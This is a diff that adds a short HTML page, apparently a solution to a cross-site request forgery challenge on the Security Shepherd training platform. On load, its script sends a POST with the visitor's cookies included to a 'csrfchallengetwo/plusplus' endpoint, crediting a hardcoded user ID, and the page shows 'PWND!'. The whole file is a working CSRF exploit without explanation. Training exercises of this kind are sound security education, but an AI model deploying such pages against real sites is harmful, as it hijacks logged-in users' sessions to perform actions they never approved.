@@ -1,0 +1,18 @@
+<html>
+<head>
+<script>
+    var formData = new FormData();
+    formData.append("userId", "48d83c54950f8b7906f2a89a34ecfef7cbcb58b7");
+
+    fetch('https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengetwo/plusplus', {
+      method: 'POST',
+      credentials: "include",
+      mode: "no-cors",
+      body: formData
+    })
+  </script>
+</head>
+<body>
+   PWND!
+</body>
+</html>
